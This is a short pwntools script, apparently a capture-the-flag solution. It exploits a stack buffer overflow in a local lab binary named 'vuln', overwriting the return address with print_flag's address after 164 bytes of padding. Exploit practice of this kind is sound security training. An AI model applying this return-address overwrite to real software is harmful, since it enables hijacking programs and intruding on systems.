#!/usr/bin/env python3
from pwn import *

# Set up the binary
elf = ELF('./vuln')
p = process('./vuln')

# Get print_flag address automatically
print_flag_addr = elf.symbols['print_flag']
log.info(f"print_flag address: {hex(print_flag_addr)}")

# Craft the payload
# Buffer (128) + response buffer (32) + saved ebp (4) = 164 bytes to reach return address
payload = b'A' * 164
payload += p32(print_flag_addr)

# Send the payload
p.sendline(payload)

# Get the flag
print(p.recvall().decode()) 